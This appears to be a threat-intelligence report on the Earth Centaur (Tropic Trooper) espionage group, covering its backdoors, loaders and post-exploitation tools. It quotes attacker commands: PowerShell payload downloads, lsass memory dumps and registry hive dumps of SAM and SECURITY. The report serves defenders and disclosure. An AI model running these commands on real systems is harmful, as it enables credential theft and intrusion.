Tropic Trooper Targets Transportation and Government Organizationstrendmicro.com/en_us/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-organizations.htmlDecember 14, 2021Collecting In the Dark: Tropic Trooper Targets Transportation and Government Our long-term monitoring of the cyberespionage group Earth Centaur (aka Tropic Trooper) shows that the threat actors are equipped with new tools and techniques. The group seems to be targeting transportation companies and government agencies related to transportation.By: Nick Dai, Ted Lee, Vickie Su December 14, 2021 Read time: 11 min (3068 words)Earth Centaur, previously known as Tropic Trooper, is a long-running cyberespionage threat group that has been active since 2011. In July 2020, we noticed interesting activity coming from the group, and we have been closely monitoring it since. The actors seem to be targeting organizations in the transportation industry and government agencies related to transport.We observed that the group tried to access some internal documents (such as flight schedules and documents for financial plans) and personal information on the compromised hosts (such as search histories). Currently, we have not discovered substantial damage to these victims as caused by the threat group. However, we believe that it will continue collecting internal information from the compromised victims and that it is simply waiting for an opportunity to use this data.Through long-term monitoring, we learned that this threat group is proficient at red teamwork. The group knows how to bypass security settings and keep its operation unobstructive. Depending on the target, it uses backdoors with different protocols, and it can also use the reverse proxy to bypass the monitoring of network security systems. The usage of the open-source frameworks also allows the group to develop new backdoor variants efficiently. We expand on these techniques and other capabilities in the following sections.More importantly, we believe the activities we observed are just the tip of the iceberg and their targets might be expanded to other industries that are related to transportation. It is our aim, through this article, to encourage enterprises to review their own security setting and protect themselves from damage and compromise.Overview of Earth Centaur’s infection chain Based on our investigation, we found that the intrusion process used by Earth Centaur can be separated into several stages, which are shown in Figure 1.1/16We found that the threat actors used vulnerable Internet Information Services (IIS) server and Exchange server vulnerabilities as entry points, and then installed web shells. Afterward, the .NET loader (detected as Nerapack) and the first stage backdoor (Quasar remote administration tool aka Quasar RAT) were deployed on the compromised machine. Then, depending on the victims, the threat actors dropped different types of second-stage backdoors, such as ChiserClient and SmileSvr.After exploiting the victim's environments successfully, the threat actors start Active Directory (AD) discovery and spread their tools via Server Message Block (SMB). Then, they use intranet penetration tools to build the connection between the victim’s intranet and their command-and-control (C&C) servers. We go into further detail about these stages in our analysis.Figure 1. Stages of Earth Centaur’s intrusion processTechnical Analysis of Earth Centaur’s Tools and TechniquesStage 1: LoadersAfter the threat actors get access to the vulnerable hosts by using ProxyLogon exploits and web shells, they use bitsadmin to download the next-stage loader (loaders are detected as Nerapack) as well as its payload file (.bin).C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command "&{Import-Module BitsTransfer; Start-BitsTransfer 'url "%temp%/dfmanager.exe"}"C:\Windows\system32\windowspowershell\v1.0\powershell.exe -Command "&{Import-ModuleBitsTransfer; Start-BitsTransfer 'url "C:\Users\ <redacted>\AppData\Local\Temp/dfmanager.bin"}"2/16After our long-term monitoring, we observed that there are two different decryption algorithms (DES or AES) used in Nerapack to decrypt the payload. Moreover, in its newer version, it uses a technique called “Timestomping.” Timestomping is when the timestamp of the payload file (.bin) is altered to make it harder for incident response analysts to find it.Figure 2. Timestomping used on the bin fileThe decryption key is used as an argument of Nerapack and various keys are used on different victims. It is a simple but effective technique that makes security analysis more difficult and also ensures that only their operators can use the tools.The command for execution is shown as here:> Nerapack.exe {base64 encoded key}Fortunately, we were still able to collect the decryption key in some cases and we decrypted the payload successfully. Based on our current cases, the decrypted payload is Quasar RAT. After the payload is deployed, the actors can continue further malicious actions through Quasar RAT.Stage 2: BackdoorsAfter further analysis, we found that the threat group developed multiple backdoors capable of communication via common network protocols. We think this indicates that it has the capability to bypass network security systems by using these common protocols to transfer data. We also found that the group tries to launch various backdoors per victim. Furthermore, it also tends to use existing frameworks to make customized backdoors. By using existing frameworks, examples of which are detailed in the following, it builds new backdoor variants more efficiently.ChiserClientAfter the backdoor is launched, it will decrypt the embedded C&C configuration via AES (CTR mode) algorithm for the following connection. In the configuration, there are three C&C addresses and corresponding port numbers.3/16Figure 3. Decrypted C&C configurationIn the first connection, ChiserClient will append the host name of the compromised host for check-in purposes. Then, it will keep running on the hosts and wait for further commands from the C&C server.ChiserClient is installed as a system service to allow the threat actors access to higher privileges and keep persistence on the compromised host. The capability of ChiserClient is shown in the following table:Command code Function0x100010x100020x100030x100040x10005HTShellWrite specified fileDownload FileRead specified fileNo ActionOpen a command shell for command executionHTShell is a simple backdoor that is developed using the Mongoose framework (version 6.15). Mongoose is an Object Data Modeling (ODM) library for MongoDB and Node.Js. It is used to translate between objects in code and objects representation in MongoDB.We saw in our cases that the HTShell client will be launched as a system service on the compromised machine and that it will connect to a C&C server. HTShell supports importing additional config files. We found that the additional config file is located in %PUBLIC%\Documents\sdcsvc.dat, and that the content should be encoded by base64. If no config file is imported, it will connect to the predefined C&C address.4/16Figure 4. HTShell hardcoded C&CsHTShell encodes a hard -coded string, "tp===" with custom base64 and embeds the encoded string in the request cookies. If the C&C server receives the request with the special cookie value, it can verify that the request comes from its client applications.Figure 5. HTShell hardcoded and encoded cookie string in the request headerThe response handler of HTShell will use “`” as delimiter to split the command code and argument for the received command. Hence, the command will be this format:<command code>`<custom-base64encoded-data>[`<more-custom-base64encoded-data>]HTShell currently supports three different backdoor functions, shown here:Command code Function01Open a command shell for command executionUpload file5/162Download fileCustomized Lilith RATDuring our investigation into Earth Centaurs activities, we found that it also uses another backdoor called Lilith RAT. We think that this Lilith RAT is a highly modified version of the open-source Lilith RAT. The actors reused part of the codes for command execution, while the C&C protocol is changed to Dropbox HTTPS APIs.Figure 6. Reused codes from open-source Lilith RATIn order to launch this RAT, the threat actors use a technique called "Phantom DLL hijacking." In this technique, the RAT will be disguised as the normal wlbsctrl.dll. While the Windows service “IKEEXT” is starting, the fake wlbsctrl.dll is loaded and executed with high privilege. Furthermore, when Lilith RAT is terminated, it will try to clean itself to prevent being found by investigators.Figure 7. Self-deletion after executionFor the C&C connections, the customized Lilith RAT will first check in to the attacker’s Dropbox and see if the victim host exists. If not, the hostname and IP address will be collected and appended to the existing compromised hosts’ information. All data will then be encrypted and sent back.6/16Figure 8. The first check-in request to the Dropbox C&CAfter the check-in request, the backdoor will start to wait for more commands to come in. All the request data are formatted to JSON, and they are encrypted by AES and encoded by base64.Here is a list of the C&C commands:CommandDescriptionCMDCommandExecutes commandsDownloadCloudFile Downloads filesUploadCloudFileUploads filesGetDirGetDirFileLists directoriesLists files in a directory7/16DeleteSelfDeletes itselfSmileSvrWe found that there are two types of SmileSvr. The difference between the two variants is the protocol used for communication: ICMP and SSL. The threat actors will use an installer to install SmileSvr as a system service and drop a DAT file that contains encoded C&C information. In the configuration file, the memory size used for storing C&C address and C&C address will be defined.Figure 9. Encrypted configuration fileThe ICMP version of SmileSvr will create an ICMP socket to connect to the specified C&C address, which is defined in a configuration file. In each SmileSvr, there is an embedded number (e.g., 10601 in Figure 10.) and this value will be used as sequence number in the sent ICMP packet. We think attackers use this value to verify if the incoming packet belongs to their backdoor and filter out the noise.Figure 10. Decrypted configuration fileWithout knowing the real traffic from the C&C server, we can only speculate on the content of the response based on the receiving function. As shown in Figure 11, the content of the response should contain the sequence number used to verify if the received data comes from the correct source and two blocks of encrypted data.The data decryption procedure is as follows:1. First, the encrypted data is decrypted with a one-byte XOR key (0xFF). 2. The first of the decrypted content contains a magic number used to check data in the second block,a command code, and the XOR key to decrypt the second set of encrypted content.3. The second set of encrypted content is decrypted with an XOR key (0x99) from the previousdecrypted content, and within the decrypted data are instructions for the following procedures.8/16Figure 11. SmileSvr packet traffic format simulationWhile analyzing samples, we found that the C&C server was already inactive. Without knowing the traffic between SmileSvr and C&C server, we could not fully understand all functions. However, most of the backdoor functions are listed here:Command code Function0x50010x50020x50040x50060x50070x50090x500A0x500C0x500EOpens/Reads specified fileUnknownOpens/Writes specified fileOpens command shellUnknownCloses command shellFile System TraversalChecks environment informationUnknownAs for the SSL version of SmileSvr, the capability of SSL communication is built by using wolfSSL, which is a lightweight, C-language based SSL/TLS library. The backdoor functions of SSL version SmileSvr are similar to the ICMP ones. The threat actors just use it to develop new ways to support data transfer via an encrypted channel.Customized Gh0st RAT9/16In our investigation, we also found a suspicious executable named telegram.exe. After analyzing the file, we found that it was a customized version of Gh0st RAT. Compared to the original Gh0st RAT (Gh0st beta 3.6), the difference is that the customized version supports a new function to discover information from active sessions on the host.All supported functions for the customized Gh0st are shown in the following table:Command code Function0xC80xCA0xCB0xCC0XD5Terminates connectionFile manager to handle file operationsScreen monitoringOpens remote shell for command executionGets active session informationPost-ExploitationAfter successfully exploiting the vulnerable system, the threat actor will use multiple hacking tools to discover and compromise machines on the victim’s intranet. In this stage, we also observed attempts to deploy tools to exfiltrate stolen information.During our investigation, we found evidence of specific tools, which we listed in Table 1. With these tools, the attackers accomplish their goals (network discovery, access to the intranet, and exfiltration) step by step.Tool namePurposeDescriptionSharpHound AD Discovery Discovery tool to understand the relationship in an AD environmentFRPCChiselIntranet PenetrationIntranet PenetrationFast reverse proxy to help expose a local server behind a NAT or firewall to the internetFast TCP/UDP tunnelRCloneExfiltrationA command-line program to sync files and directories to and from different cloud storage providersCredential DumpingWe also observed that the group used multiple legitimate tools to dump credentials on compromised machines. It made good use of these tools to achieve its goal and keep its operation hidden and unobstructive.For example, the group uses ProcDump.exe (a tool from Windows Sysinternals Suite that creates dumps of the processes in any scenario), which it renamed bootsys.exe:10/16c:\users\public\downloads\bootsys.exe -accepteula -ma lsass.exeC:\Users\Public\Downloads\lsass.dmpThe group dumps credentials stored in registries by using reg.exe:reg.exe save hklm\sam C:\Users\Public\Downloads\sam.hivereg.exe save hklm\sam c:\windows\temp\sa.ditreg.exe save hklm\security c:\windows\temp\se.ditreg.exe save hklm\system c:\windows\temp\sy.ditThe group would also dump memory from the specified process by using comsvcs.dll:rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 764 C:\Windows\TEMP\dump.bin fullIndicator RemovalTo avoid exposing their footprints to investigators, the threat actors made their own tool to wipe out the event logs on the victimized machine. By using this tool, they could clean specified event logs and make it hard for investigators to track their operations.The usage is as follows:Intranet PenetrationAfter successfully exploiting the vulnerable system, threat actors also drop following tools: FRP and Chisel. FRP is a fast reverse proxy used to expose a local server behind an NAT or a firewall to the internet. It can read predefined configurations and make the host in the intranet available to users from the internet.11/16Figure 12. Configuration for FRP fast reverse proxyChisel is a fast TCP/UDP tunnel, which is mainly used for passing through firewalls. It provides the capability to transport data over HTTP (secured via Secure Shell, aka SSH) and allows threat actors to network infrastructure and bypass the firewall. Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration. It also provides an easy and effective way of copying data to several cloud storage providers.C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -command "$(new-objectSystem.Net.WebClient).DownloadFile('url 'r.exe')"Based on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data. However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.Identifying Features in the Earth Centaur Campaign12/16After long-term observation and analysis of the attack campaigns, there was compelling evidence that they were operated by Earth Centaur. We found several identifying features of the threat actors within the techniques and tools described in the preceding sections, and we break down the factors in the following.Mutex StyleWe found some special mutexes that are encoded by the layout of the Chinese Zhuyin keyboard in ChiserClient. The decoded string is shown in Table 2. Based on these special mutex strings, we believe the threat actors come from a Chinese-speaking region.Encoded stringDecoded string in Chinese English translationvul3ru,6q8 q8 y.3小傑趴趴走ji394su3我愛你Jack goes aroundI love you5ji fu.6cl3g.3zj6m0694 桌球好手福原愛Excellent table tennis player, Ai FukuharaTable 2. Encoded/Decoded mutex stringConfiguration styleAfter analyzing the ChiserClient, we found that it shares a similar style of network configuration to the TClient mentioned in our previous research on Earth Centaur.Figure 13. Network configuration (Left: ChiserClient Right: TClient)Code SimilarityAfter checking the backdoor SmileSvr, we found that there was a code similarity between it and Troj_YAHAMAM, which was used by Earth Centaur in an earlier operation. Both share similar codes in configuration decoding, which is shown in Figure 14. Furthermore, the delimiter that was used in13/16SmileSvr to split different values in configuration files is the same as the one used in YAHAMAM (shown as Figure 15).Figure 14. Configuration decoding function (left: SmileSvr right: Troj_Yahamam)14/16Figure 15. Function used to split different values in configuration file (left: SmileSvr right: Troj_Yahamam)ConclusionThese threat actors are notably sophisticated and well-equipped. Looking deeper into the new methods the group uses, we found that it has an arsenal of tools capable of assessing and then compromising its targets while remaining under the radar. For example, the group can map their target’s network infrastructure and bypass firewalls. It uses backdoors with different protocols, which are deployed depending on the victim. It also has the capability to develop customized tools to evade security monitoring in different environments, and it exploits vulnerable websites and uses them as C&C servers.In this blog, we outlined our new findings related to these threat actors to help possible targets in the transportation and other industries. Information on how a threat enters and operates within a victim’s network is invaluable to security teams and can help them create more effective protection for vulnerable organizations. Organizations can also find capable security solutions that can help interpret and respond to malicious activities, techniques, and movements before the threat can culminate and affect an enterprise. Trend Micro Vision One™ with Managed XDR gives security teams a consolidated view into valuable insights so they can organize a more solid line of defense ahead of attacks.For a list of the Indicators of Compromise, please see this document.MITRE ATT&CK MatrixTacticsInitial accessExecutionIDTechniqueT1190Exploit public-facing applicationT1059.001 Command and Scripting Interpreter: PowerShellT1059.003 Command and scripting interpreter: Windows Command Shell15/16T1569.002 System Services: Service ExecutionPersistenceT1543.003 Create or Modify System Process: Windows ServiceDefense evasionT1574.002 Hijack Execution Flow: DLL Side-LoadingT1505.003 Server Software Component: Web ShellT1140T1480Deobfuscate/Decode Files or InformationExecution GuardrailsT1574.002 Hijack Execution Flow: DLL Side-LoadingT1070.001 Indicator Removal on Host: Clear Windows Event LogsT1027.002 Obfuscated Files or Information: Software PackingT1218.011 Signed Binary Proxy Execution: Rundll32T1036.005 Masquerading: Match Legitimate Name or LocationT1197BITS JobsT1070.006 Indicator Removal on Host: TimestompCredential AccessT1003.001 OS Credential Dumping: LSASS MemoryT1552.002 OS Credential Dumping: Credentials in RegistryLateral MovementT1021.002 Remote Services: SMB/Windows Admin SharesDiscoveryT1087.002 Account Discovery: Domain AccountT1482T1083T1005Domain Trust DiscoveryFile and Directory DiscoveryData from Local SystemCollectionCommand and control T1071.001 Application layer protocol: web protocolsT1095Non-Application layer protocolT1090.001 Proxy: Internal ProxyExfiltrationT1567.002 Exfiltration to Cloud Storage16/16 